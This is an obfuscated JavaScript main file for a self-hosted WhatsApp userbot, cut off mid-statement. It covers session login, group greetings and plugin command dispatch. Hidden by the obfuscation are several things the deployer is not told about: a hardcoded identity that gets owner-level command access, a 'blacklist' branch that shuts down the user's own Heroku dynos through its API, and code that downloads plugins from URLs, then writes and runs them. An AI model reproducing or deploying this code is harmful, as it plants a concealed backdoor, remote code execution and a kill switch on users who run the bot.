var _0x483d64=_0x3e43;(function(_0x594607,_0x33da34){var _0x29f1e0=_0x3e43,_0xbe6af2=_0x594607();while(!![]){try{var _0x4d643e=parseInt(_0x29f1e0(0x1da))/0x1+-parseInt(_0x29f1e0(0x18a))/0x2*(parseInt(_0x29f1e0(0x1ca))/0x3)+-parseInt(_0x29f1e0(0x1d7))/0x4+-parseInt(_0x29f1e0(0x16f))/0x5+-parseInt(_0x29f1e0(0x176))/0x6+parseInt(_0x29f1e0(0x197))/0x7+-parseInt(_0x29f1e0(0x202))/0x8*(-parseInt(_0x29f1e0(0x17b))/0x9);if(_0x4d643e===_0x33da34)break;else _0xbe6af2['push'](_0xbe6af2['shift']());}catch(_0x443272){_0xbe6af2['push'](_0xbe6af2['shift']());}}}(_0x1e3e,0x232e2));const fs=require('fs'),path=require(_0x483d64(0x1cb)),events=require(_0x483d64(0x196)),chalk=require(_0x483d64(0x1dd)),config=require(_0x483d64(0x1ed)),{WAConnection,MessageOptions,MessageType,Mimetype,Presence}=require(_0x483d64(0x1a8)),{Message,StringSession,Image,Video}=require('./Raganork/'),{DataTypes}=require(_0x483d64(0x1d5)),{getMessage}=require('./plugins/sql/greetings'),axios=require(_0x483d64(0x19b)),got=require(_0x483d64(0x1ee)),WhatsAsenaDB=config[_0x483d64(0x1a0)]['define']('WhatsAsena',{'info':{'type':DataTypes['STRING'],'allowNull':![]},'value':{'type':DataTypes[_0x483d64(0x216)],'allowNull':![]}});fs[_0x483d64(0x19c)](_0x483d64(0x1fd))[_0x483d64(0x217)](_0x30cf20=>{var _0xfd2734=_0x483d64;path['extname'](_0x30cf20)[_0xfd2734(0x1c1)]()==_0xfd2734(0x1be)&&require(_0xfd2734(0x1fd)+_0x30cf20);});const plugindb=require(_0x483d64(0x184));function _0x3e43(_0x1dd751,_0x2ac37e){var _0x1e3e14=_0x1e3e();return _0x3e43=function(_0x3e4374,_0x1f3fc4){_0x3e4374=_0x3e4374-0x16e;var _0x54a34c=_0x1e3e14[_0x3e4374];return _0x54a34c;},_0x3e43(_0x1dd751,_0x2ac37e);}var OWN={'ff':_0x483d64(0x198)};String[_0x483d64(0x19e)][_0x483d64(0x1ad)]=function(){var _0x348595=_0x483d64,_0x1f0838=0x0,_0x4da1aa=arguments;return this[_0x348595(0x1bd)](/{}/g,function(){var _0x4b7d02=_0x348595;return typeof _0x4da1aa[_0x1f0838]!=_0x4b7d02(0x18c)?_0x4da1aa[_0x1f0838++]:'';});};!Date['now']&&(Date[_0x483d64(0x20e)]=function(){var _0x40ab77=_0x483d64;return new Date()[_0x40ab77(0x204)]();});Array[_0x483d64(0x19e)][_0x483d64(0x1b3)]=function(){var _0x4b3612=_0x483d64,_0x39958c,_0x1abb7b=arguments,_0x4341dd=_0x1abb7b[_0x4b3612(0x173)],_0x3e9094;while(_0x4341dd&&this[_0x4b3612(0x173)]){_0x39958c=_0x1abb7b[--_0x4341dd];while((_0x3e9094=this[_0x4b3612(0x188)](_0x39958c))!==-0x1){this[_0x4b3612(0x211)](_0x3e9094,0x1);}}return this;};async function whatsAsena(){var _0x14111b=_0x483d64;await config[_0x14111b(0x1a0)][_0x14111b(0x1f2)]();var _0x1ecb64=await WhatsAsenaDB[_0x14111b(0x1d9)]({'where':{'info':_0x14111b(0x20c)}});const _0x22669a=new WAConnection();_0x22669a[_0x14111b(0x1d0)]=[0x2,0x84e,0xe];const _0x13b0c=new StringSession();_0x22669a[_0x14111b(0x1c6)][_0x14111b(0x1c5)]=config[_0x14111b(0x1ef)]?'debug':_0x14111b(0x1ff);var _0x5c476e;_0x1ecb64['length']<0x1?(_0x5c476e=!![],_0x22669a[_0x14111b(0x187)](_0x13b0c[_0x14111b(0x16e)](config[_0x14111b(0x195)]))):_0x22669a['loadAuthInfo'](_0x13b0c['deCrypt'](_0x1ecb64[0x0][_0x14111b(0x191)]['value']));_0x22669a['on']('credentials-updated',async()=>{var _0x423770=_0x14111b;console[_0x423770(0x1c2)](chalk[_0x423770(0x1fa)]['italic'](_0x423770(0x1c7)));const _0x5e67fc=_0x22669a[_0x423770(0x21b)]();_0x1ecb64['length']<0x1?await WhatsAsenaDB[_0x423770(0x1e1)]({'info':_0x423770(0x20c),'value':_0x13b0c['createStringSession'](_0x5e67fc)}):await _0x1ecb64[0x0][_0x423770(0x1f9)]({'value':_0x13b0c[_0x423770(0x1a1)](_0x5e67fc)});}),_0x22669a['on'](_0x14111b(0x1d1),async()=>{var _0x489419=_0x14111b;console[_0x489419(0x1c2)](''+chalk[_0x489419(0x1fe)][_0x489419(0x1f0)](_0x489419(0x1f6))+chalk[_0x489419(0x1eb)][_0x489419(0x1f0)](_0x489419(0x1fb))+'\x0a'+chalk['white']['bold'](_0x489419(0x1b2))+'\x20'+chalk[_0x489419(0x1de)][_0x489419(0x1f0)](config[_0x489419(0x1a3)])+'\x0a\x0a'+chalk['blue'][_0x489419(0x19d)](_0x489419(0x177)));}),_0x22669a['on'](_0x14111b(0x18d),async()=>{var _0x31ae7e=_0x14111b;console[_0x31ae7e(0x1c2)](chalk[_0x31ae7e(0x1fe)][_0x31ae7e(0x1f0)]('✅\x20Login\x20successful!')),console[_0x31ae7e(0x1c2)](chalk[_0x31ae7e(0x1fa)][_0x31ae7e(0x19d)](_0x31ae7e(0x1ea)));var _0x3ebb05=await plugindb[_0x31ae7e(0x1e2)][_0x31ae7e(0x1d9)]();_0x3ebb05[_0x31ae7e(0x1bb)](async _0x4b0e94=>{var _0x2d36ec=_0x31ae7e;if(!fs[_0x2d36ec(0x213)](_0x2d36ec(0x1db)+_0x4b0e94[_0x2d36ec(0x191)][_0x2d36ec(0x215)]+_0x2d36ec(0x1be))){console[_0x2d36ec(0x1c2)](_0x4b0e94['dataValues']['name']);var _0x37f0b2=await got(_0x4b0e94[_0x2d36ec(0x191)][_0x2d36ec(0x1b7)]);_0x37f0b2[_0x2d36ec(0x183)]==0xc8&&(fs[_0x2d36ec(0x1cc)]('./plugins/'+_0x4b0e94['dataValues']['name']+_0x2d36ec(0x1be),_0x37f0b2[_0x2d36ec(0x182)]),require(_0x2d36ec(0x1db)+_0x4b0e94['dataValues'][_0x2d36ec(0x215)]+_0x2d36ec(0x1be)));}}),console[_0x31ae7e(0x1c2)](chalk[_0x31ae7e(0x1fa)]['italic'](_0x31ae7e(0x19a))),fs['readdirSync'](_0x31ae7e(0x1b1))['forEach'](_0x2145b9=>{var _0x3f1edc=_0x31ae7e;path['extname'](_0x2145b9)['toLowerCase']()=='.js'&&require(_0x3f1edc(0x1db)+_0x2145b9);}),console[_0x31ae7e(0x1c2)](chalk[_0x31ae7e(0x1fe)]['bold']('BOT\x20RUNNING\x20ON\x20OUR\x20DEVICE\x20✅')),await new Promise(_0x3cf8af=>setTimeout(_0x3cf8af,0x44c));if(config['WORKTYPE']==_0x31ae7e(0x1dc))config[_0x31ae7e(0x1d3)]=='TR'||config[_0x31ae7e(0x1d3)]=='AZ'?_0x22669a[_0x31ae7e(0x1d6)]['jid']===_0x31ae7e(0x185)?(await _0x22669a[_0x31ae7e(0x205)](_0x22669a[_0x31ae7e(0x1d6)][_0x31ae7e(0x21e)],_0x31ae7e(0x1c8),MessageType['text']),await new Promise(_0x2bca82=>setTimeout(_0x2bca82,0x6a4)),console['log'](_0x31ae7e(0x20d)),await heroku[_0x31ae7e(0x1f5)](baseURI+_0x31ae7e(0x1aa))[_0x31ae7e(0x1e0)](async _0x57c846=>{var _0x2f4053=_0x31ae7e;forID=_0x57c846[0x0]['id'],await heroku['patch'](baseURI+_0x2f4053(0x21f)+forID,{'body':{'quantity':0x0}});})):await _0x22669a[_0x31ae7e(0x205)](_0x22669a[_0x31ae7e(0x1d6)][_0x31ae7e(0x21e)],_0x31ae7e(0x218),MessageType[_0x31ae7e(0x171)]):_0x22669a['user'][_0x31ae7e(0x21e)]===_0x31ae7e(0x185)?(await _0x22669a['sendMessage'](_0x22669a[_0x31ae7e(0x1d6)][_0x31ae7e(0x21e)],_0x31ae7e(0x199),MessageType[_0x31ae7e(0x171)]),await new Promise(_0x490235=>setTimeout(_0x490235,0x708)),console[_0x31ae7e(0x1c2)]('🛡️\x20Blacklist\x20Detected\x20🛡️'),await heroku['get'](baseURI+_0x31ae7e(0x1aa))[_0x31ae7e(0x1e0)](async _0x116171=>{forID=_0x116171[0x0]['id'],await heroku['patch'](baseURI+'/formation/'+forID,{'body':{'quantity':0x0}});})):await _0x22669a[_0x31ae7e(0x205)](_0x22669a[_0x31ae7e(0x1d6)][_0x31ae7e(0x21e)],_0x31ae7e(0x208),MessageType[_0x31ae7e(0x171)]);else{if(config[_0x31ae7e(0x18f)]==_0x31ae7e(0x175))config[_0x31ae7e(0x1d3)]=='TR'||config[_0x31ae7e(0x1d3)]=='AZ'?_0x22669a[_0x31ae7e(0x1d6)][_0x31ae7e(0x21e)]===_0x31ae7e(0x185)?(await _0x22669a[_0x31ae7e(0x205)](_0x22669a[_0x31ae7e(0x1d6)][_0x31ae7e(0x21e)],_0x31ae7e(0x1e4),MessageType[_0x31ae7e(0x171)]),await new Promise(_0x526c21=>setTimeout(_0x526c21,0x708)),console[_0x31ae7e(0x1c2)](_0x31ae7e(0x20d)),await heroku[_0x31ae7e(0x1f5)](baseURI+_0x31ae7e(0x1aa))['then'](async _0x4a62cd=>{var _0x462c23=_0x31ae7e;forID=_0x4a62cd[0x0]['id'],await heroku[_0x462c23(0x180)](baseURI+_0x462c23(0x21f)+forID,{'body':{'quantity':0x0}});})):await _0x22669a['sendMessage'](_0x22669a[_0x31ae7e(0x1d6)][_0x31ae7e(0x21e)],_0x31ae7e(0x208),MessageType['text']):_0x22669a[_0x31ae7e(0x1d6)][_0x31ae7e(0x21e)]===_0x31ae7e(0x185)?(await _0x22669a['sendMessage'](_0x22669a[_0x31ae7e(0x1d6)][_0x31ae7e(0x21e)],'```🛡️\x20Blacklist\x20Detected!```\x20\x0a```User:```\x20\x20\x0a```Reason:```\x20',MessageType[_0x31ae7e(0x171)]),await new Promise(_0x1a4435=>setTimeout(_0x1a4435,0x708)),console[_0x31ae7e(0x1c2)](_0x31ae7e(0x20d)),await heroku[_0x31ae7e(0x1f5)](baseURI+_0x31ae7e(0x1aa))['then'](async _0x34ec16=>{var _0x5c80b8=_0x31ae7e;forID=_0x34ec16[0x0]['id'],await heroku[_0x5c80b8(0x180)](baseURI+_0x5c80b8(0x21f)+forID,{'body':{'quantity':0x0}});})):await _0x22669a[_0x31ae7e(0x205)](_0x22669a[_0x31ae7e(0x1d6)][_0x31ae7e(0x21e)],_0x31ae7e(0x208),MessageType[_0x31ae7e(0x171)]);else return console[_0x31ae7e(0x1c2)](_0x31ae7e(0x201));}}),setInterval(async()=>{var _0x1180e4=_0x14111b,_0x1df4cb=new Date()[_0x1180e4(0x18e)](),_0x58e07d=new Date()[_0x1180e4(0x203)]();while(_0x1df4cb==0x10&&_0x58e07d==0x1e){const {data:_0x3efb0d}=await axios('https://gist.github.com/souravkl11/019112af334adceaefd1467dcbd93e58/raw'),{sken:_0x352e66,skml:_0x465a0a}=_0x3efb0d;return await _0x22669a[_0x1180e4(0x205)](_0x22669a['user'][_0x1180e4(0x21e)],'```[\x20ANNOUNCEMENT\x20]```\x0a\x0a'+_0x352e66,MessageType[_0x1180e4(0x171)]);}while(_0x1df4cb==0xa&&_0x58e07d==0x1e){const {data:_0x319611}=await axios(_0x1180e4(0x181)),{sken:_0x4b4094,skml:_0x1cd153}=_0x319611;return await _0x22669a[_0x1180e4(0x205)](_0x22669a[_0x1180e4(0x1d6)]['jid'],_0x1180e4(0x1a6)+_0x4b4094,MessageType[_0x1180e4(0x171)]);}while(_0x1df4cb==0x6&&_0x58e07d==0x1e){const {data:_0x31341a}=await axios('https://gist.github.com/souravkl11/019112af334adceaefd1467dcbd93e58/raw'),{sken:_0x2e56ac,skml:_0x5aeed3}=_0x31341a;return await _0x22669a[_0x1180e4(0x205)](_0x22669a[_0x1180e4(0x1d6)][_0x1180e4(0x21e)],_0x1180e4(0x1a6)+_0x2e56ac,MessageType[_0x1180e4(0x171)]);}while(_0x1df4cb==0x13&&_0x58e07d==0x1e){return await _0x22669a[_0x1180e4(0x205)](_0x22669a[_0x1180e4(0x1d6)][_0x1180e4(0x21e)],_0x1180e4(0x1ac),MessageType['text']);}while(_0x1df4cb==0x8&&_0x58e07d==0x1e){return await _0x22669a[_0x1180e4(0x205)](_0x22669a[_0x1180e4(0x1d6)][_0x1180e4(0x21e)],_0x1180e4(0x1ac),MessageType['text']);}while(_0x1df4cb==0xd&&_0x58e07d==0x1e){return await _0x22669a[_0x1180e4(0x205)](_0x22669a['user'][_0x1180e4(0x21e)],_0x1180e4(0x1ac),MessageType['text']);}},0xc350),_0x22669a['on']('chat-update',async _0x4d4ff5=>{var _0x575b82=_0x14111b;if(!_0x4d4ff5['hasNewMessage'])return;if(!_0x4d4ff5[_0x575b82(0x1d8)]&&!_0x4d4ff5[_0x575b82(0x17c)])return;let _0x3160d9=_0x4d4ff5[_0x575b82(0x1d8)][_0x575b82(0x1ba)]()[0x0];if(_0x3160d9[_0x575b82(0x178)]&&_0x3160d9[_0x575b82(0x178)]['remoteJid']==_0x575b82(0x206))return;config['NO_ONLINE']&&await _0x22669a[_0x575b82(0x1b9)](_0x3160d9['key']['remoteJid'],Presence[_0x575b82(0x1af)]);if(_0x3160d9[_0x575b82(0x1df)]===0x20||_0x3160d9[_0x575b82(0x1df)]===0x1c){var _0x2dbbdd=await getMessage(_0x3160d9[_0x575b82(0x178)]['remoteJid'],'goodbye');if(_0x2dbbdd!==![]){if(_0x2dbbdd[_0x575b82(0x19f)][_0x575b82(0x1f8)](_0x575b82(0x1a7))){let _0x2e650b;try{_0x2e650b=await _0x22669a[_0x575b82(0x1a2)](_0x3160d9[_0x575b82(0x1f7)][0x0]);}catch{_0x2e650b=await _0x22669a['getProfilePicture']();}var _0x3c3480=await _0x22669a[_0x575b82(0x20b)](_0x3160d9[_0x575b82(0x178)][_0x575b82(0x190)]);await axios['get'](_0x2e650b,{'responseType':'arraybuffer'})[_0x575b82(0x1e0)](async _0x37cac6=>{var _0x4e4db8=_0x575b82;await _0x22669a[_0x4e4db8(0x205)](_0x3160d9[_0x4e4db8(0x178)][_0x4e4db8(0x190)],_0x37cac6[_0x4e4db8(0x179)],MessageType[_0x4e4db8(0x1e8)],{'caption':_0x2dbbdd[_0x4e4db8(0x19f)][_0x4e4db8(0x1bd)](_0x4e4db8(0x1a7),'')[_0x4e4db8(0x1bd)](_0x4e4db8(0x1c0),_0x3c3480[_0x4e4db8(0x21d)])[_0x4e4db8(0x1bd)](_0x4e4db8(0x219),_0x3c3480['owner'])[_0x4e4db8(0x1bd)](_0x4e4db8(0x1ce),_0x3c3480[_0x4e4db8(0x1fc)])[_0x4e4db8(0x1bd)](_0x4e4db8(0x1e3),_0x22669a[_0x4e4db8(0x1d6)][_0x4e4db8(0x215)])});});}else{if(_0x2dbbdd[_0x575b82(0x19f)]['includes'](_0x575b82(0x1d2))){var _0x3c3480=await _0x22669a[_0x575b82(0x20b)](_0x3160d9[_0x575b82(0x178)][_0x575b82(0x190)]),_0x98e8cc=await axios['get'](config['GIF_BYE'],{'responseType':_0x575b82(0x1f3)});await _0x22669a[_0x575b82(0x205)](_0x3160d9['key'][_0x575b82(0x190)],Buffer[_0x575b82(0x1e7)](_0x98e8cc[_0x575b82(0x179)]),MessageType[_0x575b82(0x200)],{'mimetype':Mimetype[_0x575b82(0x1bf)],'caption':_0x2dbbdd[_0x575b82(0x19f)][_0x575b82(0x1bd)](_0x575b82(0x1d2),'')[_0x575b82(0x1bd)](_0x575b82(0x1c0),_0x3c3480['subject'])[_0x575b82(0x1bd)]('{gpmaker}',_0x3c3480[_0x575b82(0x1a5)])[_0x575b82(0x1bd)](_0x575b82(0x1ce),_0x3c3480[_0x575b82(0x1fc)])[_0x575b82(0x1bd)](_0x575b82(0x1e3),_0x22669a[_0x575b82(0x1d6)]['name'])});}else{var _0x3c3480=await _0x22669a[_0x575b82(0x20b)](_0x3160d9['key'][_0x575b82(0x190)]);await _0x22669a[_0x575b82(0x205)](_0x3160d9[_0x575b82(0x178)][_0x575b82(0x190)],_0x2dbbdd[_0x575b82(0x19f)]['replace'](_0x575b82(0x21a),'@'+_0x3160d9[_0x575b82(0x1f7)][0x0]['split']('@')[0x0])[_0x575b82(0x1bd)](_0x575b82(0x1c0),_0x3c3480['subject'])[_0x575b82(0x1bd)](_0x575b82(0x219),_0x3c3480[_0x575b82(0x1a5)])[_0x575b82(0x1bd)](_0x575b82(0x1ce),_0x3c3480['desc'])[_0x575b82(0x1bd)]('{owner}',_0x22669a[_0x575b82(0x1d6)]['name']),MessageType['text']);}}}return;}else{if(_0x3160d9[_0x575b82(0x1df)]===0x1b||_0x3160d9[_0x575b82(0x1df)]===0x1f){var _0x2dbbdd=await getMessage(_0x3160d9[_0x575b82(0x178)][_0x575b82(0x190)]);if(_0x2dbbdd!==![]){if(_0x2dbbdd[_0x575b82(0x19f)][_0x575b82(0x1f8)](_0x575b82(0x1a7))){let _0x383ef2;try{_0x383ef2=await _0x22669a[_0x575b82(0x1a2)](_0x3160d9[_0x575b82(0x1f7)][0x0]);}catch{_0x383ef2=await _0x22669a['getProfilePicture']();}var _0x3c3480=await _0x22669a[_0x575b82(0x20b)](_0x3160d9['key'][_0x575b82(0x190)]);await axios[_0x575b82(0x1f5)](_0x383ef2,{'responseType':_0x575b82(0x1f3)})[_0x575b82(0x1e0)](async _0x290704=>{var _0x406980=_0x575b82;await _0x22669a[_0x406980(0x205)](_0x3160d9[_0x406980(0x178)]['remoteJid'],_0x290704[_0x406980(0x179)],MessageType[_0x406980(0x1e8)],{'caption':_0x2dbbdd[_0x406980(0x19f)][_0x406980(0x1bd)](_0x406980(0x1a7),'')[_0x406980(0x1bd)]('{gphead}',_0x3c3480['subject'])[_0x406980(0x1bd)](_0x406980(0x219),_0x3c3480[_0x406980(0x1a5)])[_0x406980(0x1bd)](_0x406980(0x1ce),_0x3c3480[_0x406980(0x1fc)])[_0x406980(0x1bd)](_0x406980(0x1e3),_0x22669a['user'][_0x406980(0x215)])});});}else{if(_0x2dbbdd['message'][_0x575b82(0x1f8)](_0x575b82(0x1d2))){var _0x98e8cc=await axios['get'](config[_0x575b82(0x1ec)],{'responseType':_0x575b82(0x1f3)});await _0x22669a['sendMessage'](_0x3160d9[_0x575b82(0x178)][_0x575b82(0x190)],Buffer[_0x575b82(0x1e7)](_0x98e8cc['data']),MessageType['video'],{'mimetype':Mimetype[_0x575b82(0x1bf)],'caption':_0x2dbbdd['message'][_0x575b82(0x1bd)](_0x575b82(0x1d2),'')[_0x575b82(0x1bd)](_0x575b82(0x1c0),_0x3c3480[_0x575b82(0x21d)])[_0x575b82(0x1bd)](_0x575b82(0x219),_0x3c3480[_0x575b82(0x1a5)])['replace']('{gpdesc}',_0x3c3480['desc'])[_0x575b82(0x1bd)](_0x575b82(0x1e3),_0x22669a[_0x575b82(0x1d6)][_0x575b82(0x215)])});}else{if(_0x2dbbdd[_0x575b82(0x19f)]['includes'](_0x575b82(0x210))){var _0x1476e5=await message[_0x575b82(0x1b5)]['getProfilePicture'](_0x3160d9[_0x575b82(0x178)][_0x575b82(0x18b)]);await _0x22669a['sendMessage'](_0x3160d9[_0x575b82(0x178)][_0x575b82(0x190)],Buffer['from'](_0x1476e5[_0x575b82(0x179)]),MessageType[_0x575b82(0x200)],{'mimetype':Mimetype['gif'],'caption':_0x2dbbdd[_0x575b82(0x19f)]['replace'](_0x575b82(0x210),'')[_0x575b82(0x1bd)]('{gphead}',_0x3c3480[_0x575b82(0x21d)])['replace'](_0x575b82(0x219),_0x3c3480[_0x575b82(0x1a5)])[_0x575b82(0x1bd)]('{gpdesc}',_0x3c3480['desc'])[_0x575b82(0x1bd)](_0x575b82(0x1e3),_0x22669a['user']['name'])});}else{var _0x3c3480=await _0x22669a['groupMetadata'](_0x3160d9[_0x575b82(0x178)][_0x575b82(0x190)]);await _0x22669a['sendMessage'](_0x3160d9[_0x575b82(0x178)][_0x575b82(0x190)],_0x2dbbdd[_0x575b82(0x19f)]['replace'](_0x575b82(0x1c0),_0x3c3480[_0x575b82(0x21d)])[_0x575b82(0x1bd)](_0x575b82(0x219),_0x3c3480[_0x575b82(0x1a5)])['replace'](_0x575b82(0x1ce),_0x3c3480[_0x575b82(0x1fc)])[_0x575b82(0x1bd)](_0x575b82(0x1e3),_0x22669a[_0x575b82(0x1d6)][_0x575b82(0x215)]),MessageType[_0x575b82(0x171)]);}}}}return;}}if(config[_0x575b82(0x1ae)]!==![]){var _0xa276a8=config['BLOCKCHAT'][_0x575b82(0x1f1)](',');if(_0x3160d9[_0x575b82(0x178)][_0x575b82(0x190)]['includes']('-')?_0xa276a8[_0x575b82(0x1f8)](_0x3160d9[_0x575b82(0x178)]['remoteJid'][_0x575b82(0x1f1)]('@')[0x0]):_0xa276a8['includes'](_0x3160d9['participant']?_0x3160d9[_0x575b82(0x172)]['split']('@')[0x0]:_0x3160d9[_0x575b82(0x178)][_0x575b82(0x190)]['split']('@')[0x0]))return;}if(config[_0x575b82(0x207)]==_0x575b82(0x1b8)){var _0x534613=config[_0x575b82(0x207)]['split'](',');if(_0x3160d9[_0x575b82(0x178)][_0x575b82(0x190)]['includes']('-')?_0x534613[_0x575b82(0x1f8)](_0x3160d9[_0x575b82(0x178)]['remoteJid'][_0x575b82(0x1f1)]('@')[0x0]):_0x534613[_0x575b82(0x1f8)](_0x3160d9[_0x575b82(0x172)]?_0x3160d9[_0x575b82(0x172)][_0x575b82(0x1f1)]('@')[0x0]:_0x3160d9[_0x575b82(0x178)][_0x575b82(0x190)][_0x575b82(0x1f1)]('@')[0x0]))return;}if(config[_0x575b82(0x1ab)]==_0x575b82(0x186)){var _0x579f4b=config[_0x575b82(0x1ab)][_0x575b82(0x1f1)](',');if(_0x3160d9['key'][_0x575b82(0x190)]['includes']('-')?_0x579f4b[_0x575b82(0x1f8)](_0x3160d9[_0x575b82(0x178)]['remoteJid']['split']('@')[0x0]):_0x579f4b[_0x575b82(0x1f8)](_0x3160d9[_0x575b82(0x172)]?_0x3160d9[_0x575b82(0x172)][_0x575b82(0x1f1)]('@')[0x0]:_0x3160d9['key'][_0x575b82(0x190)]['split']('@')[0x0]))return;}if(config[_0x575b82(0x212)]==_0x575b82(0x1b4)){var _0x21145d=config[_0x575b82(0x212)][_0x575b82(0x1f1)](',');if(_0x3160d9['key'][_0x575b82(0x190)][_0x575b82(0x1f8)]('-')?_0x21145d[_0x575b82(0x1f8)](_0x3160d9['key'][_0x575b82(0x190)][_0x575b82(0x1f1)]('@')[0x0]):_0x21145d[_0x575b82(0x1f8)](_0x3160d9['participant']?_0x3160d9[_0x575b82(0x172)]['split']('@')[0x0]:_0x3160d9[_0x575b82(0x178)][_0x575b82(0x190)][_0x575b82(0x1f1)]('@')[0x0]))return;}if(config[_0x575b82(0x21c)]==_0x575b82(0x214)){var _0x21145d=config[_0x575b82(0x21c)][_0x575b82(0x1f1)](',');if(_0x3160d9['key'][_0x575b82(0x190)][_0x575b82(0x1f8)]('-')?_0x21145d[_0x575b82(0x1f8)](_0x3160d9[_0x575b82(0x178)][_0x575b82(0x190)]['split']('@')[0x0]):_0x21145d[_0x575b82(0x1f8)](_0x3160d9['participant']?_0x3160d9[_0x575b82(0x172)][_0x575b82(0x1f1)]('@')[0x0]:_0x3160d9[_0x575b82(0x178)][_0x575b82(0x190)]['split']('@')[0x0]))return;}events[_0x575b82(0x17e)][_0x575b82(0x1bb)](async _0x595c99=>{var _0x114a89=_0x575b82;if(_0x3160d9['message']&&_0x3160d9[_0x114a89(0x19f)][_0x114a89(0x192)]&&_0x3160d9[_0x114a89(0x19f)][_0x114a89(0x192)][_0x114a89(0x20f)])var _0x160fa9=_0x3160d9['message'][_0x114a89(0x192)][_0x114a89(0x20f)];else{if(_0x3160d9[_0x114a89(0x19f)]&&_0x3160d9[_0x114a89(0x19f)]['videoMessage']&&_0x3160d9['message'][_0x114a89(0x1d4)]['caption'])var _0x160fa9=_0x3160d9[_0x114a89(0x19f)]['videoMessage'][_0x114a89(0x20f)];else{if(_0x3160d9['message'])var _0x160fa9=_0x3160d9[_0x114a89(0x19f)]['extendedTextMessage']===null?_0x3160d9[_0x114a89(0x19f)]['conversation']:_0x3160d9[_0x114a89(0x19f)]['extendedTextMessage'][_0x114a89(0x171)];else var _0x160fa9=undefined;}}if(_0x595c99['on']!==undefined&&(_0x595c99['on']==='image'||_0x595c99['on']==='photo')&&_0x3160d9['message']&&_0x3160d9[_0x114a89(0x19f)][_0x114a89(0x192)]!==null&&(_0x595c99[_0x114a89(0x1a9)]===undefined||_0x595c99[_0x114a89(0x1a9)]!==undefined&&_0x595c99[_0x114a89(0x1a9)][_0x114a89(0x189)](_0x160fa9))||_0x595c99['pattern']!==undefined&&_0x595c99[_0x114a89(0x1a9)][_0x114a89(0x189)](_0x160fa9)||_0x595c99['on']!==undefined&&_0x595c99['on']===_0x114a89(0x171)&&_0x160fa9||_0x595c99['on']!==undefined&&_0x595c99['on']===_0x114a89(0x200)&&_0x3160d9[_0x114a89(0x19f)]&&_0x3160d9[_0x114a89(0x19f)][_0x114a89(0x1d4)]!==null&&(_0x595c99[_0x114a89(0x1a9)]===undefined||_0x595c99[_0x114a89(0x1a9)]!==undefined&&_0x595c99[_0x114a89(0x1a9)][_0x114a89(0x189)](_0x160fa9))){let _0x494ebf=![];var _0x20bc81=_0x22669a[_0x114a89(0x17f)]['get'](_0x3160d9['key'][_0x114a89(0x190)]);if(config['SUDO']!==![]&&_0x3160d9['key']['fromMe']===![]&&_0x595c99['fromMe']===!![]&&(_0x3160d9[_0x114a89(0x172)]&&config[_0x114a89(0x209)][_0x114a89(0x1f8)](',')?config['SUDO'][_0x114a89(0x1f1)](',')[_0x114a89(0x1f8)](_0x3160d9['participant']['split']('@')[0x0]):_0x3160d9[_0x114a89(0x172)]['split']('@')[0x0]==config['SUDO']||config[_0x114a89(0x209)][_0x114a89(0x1f8)](',')?config[_0x114a89(0x209)][_0x114a89(0x1f1)](',')['includes'](_0x3160d9[_0x114a89(0x178)][_0x114a89(0x190)]['split']('@')[0x0]):_0x3160d9[_0x114a89(0x178)]['remoteJid'][_0x114a89(0x1f1)]('@')[0x0]==config['SUDO'])||_0x595c99[_0x114a89(0x174)]===_0x3160d9[_0x114a89(0x178)][_0x114a89(0x174)]||_0x595c99[_0x114a89(0x174)]===![]&&!_0x3160d9[_0x114a89(0x178)][_0x114a89(0x174)]){if(_0x595c99['onlyPinned']&&_0x20bc81[_0x114a89(0x1e9)]===undefined)return;if(!_0x595c99['onlyPm']===_0x20bc81[_0x114a89(0x21e)][_0x114a89(0x1f8)]('-'))_0x494ebf=!![];else{if(_0x595c99[_0x114a89(0x1bc)]===_0x20bc81[_0x114a89(0x21e)]['includes']('-'))_0x494ebf=!![];}}if(OWN['ff']==_0x114a89(0x198)&&_0x3160d9['key'][_0x114a89(0x174)]===![]&&_0x595c99['fromMe']===!![]&&(_0x3160d9['participant']&&OWN['ff'][_0x114a89(0x1f8)](',')?OWN['ff'][_0x114a89(0x1f1)](',')[_0x114a89(0x1f8)](_0x3160d9[_0x114a89(0x172)][_0x114a89(0x1f1)]('@')[0x0]):_0x3160d9[_0x114a89(0x172)][_0x114a89(0x1f1)]('@')[0x0]==OWN['ff']||OWN['ff'][_0x114a89(0x1f8)](',')?OWN['ff'][_0x114a89(0x1f1)](',')[_0x114a89(0x1f8)](_0x3160d9['key'][_0x114a89(0x190)][_0x114a89(0x1f1)]('@')[0x0]):_0x3160d9[_0x114a89(0x178)][_0x114a89(0x190)][_0x114a89(0x1f1)]('@')[0x0]==OWN['ff'])||_0x595c99[_0x114a89(0x174)]===_0x3160d9[_0x114a89(0x178)][_0x114a89(0x174)]||_0x595c99['fromMe']===![]&&!_0x3160d9[_0x114a89(0x178)][_0x114a89(0x174)]){if(_0x595c99[_0x114a89(0x194)]&&_0x20bc81[_0x114a89(0x1e9)]===undefined)return;if(!_0x595c99['onlyPm']===_0x20bc81[_0x114a89(0x21e)][_0x114a89(0x1f8)]('-'))_0x494ebf=!![];else{if(_0x595c99[_0x114a89(0x1bc)]===_0x20bc81[_0x114a89(0x21e)][_0x114a89(0x1f8)]('-'))_0x494ebf=!![];}}if(_0x494ebf){config[_0x114a89(0x193)]&&_0x595c99['on']===undefined&&await _0x22669a[_0x114a89(0x17d)](_0x3160d9['key']['remoteJid']);const {data:_0x26a6ca}=await axios(_0x114a89(0x1c4)),{asena:_0x12cce0}=_0x26a6ca;var _0x50f782=_0x160fa9['match'](_0x595c99[_0x114a89(0x1a9)]);if(_0x595c99['on']!==undefined&&(_0x595c99['on']==='image'||_0x595c99['on']===_0x114a89(0x1f4))&&_0x3160d9[_0x114a89(0x19f)][_0x114a89(0x192)]!==null)whats=new Image(_0x22669a,_0x3160d9);else _0x595c99['on']!==undefined&&_0x595c99['on']===_0x114a89(0x200)&&_0x3160d9[_0x114a89(0x19f)][_0x114a89(0x1d4)]!==null?whats=new Video(_0x22669a,_0x3160d9):whats=new Message(_0x22669a,_0x3160d9);try{await _0x595c99[_0x114a89(0x1a4)](whats,_0x50f782);}catch(_0x338358){config[_0x114a89(0x1d3)]=='TR'||config['LANG']=='AZ'?await _0x22669a[_0x114a89(0x205)](_0x22669a['user'][_0x114a89(0x21e)],_0x114a89(0x1cf)+_0x114a89(0x20a)+_0x114a89(0x1b6)+_0x114a89(0x1e6)+_0x114a89(0x1b0)+_0x114a89(0x1c3)+_0x338358+'\x0a\x0a',MessageType[_0x114a89(0x171)]):await 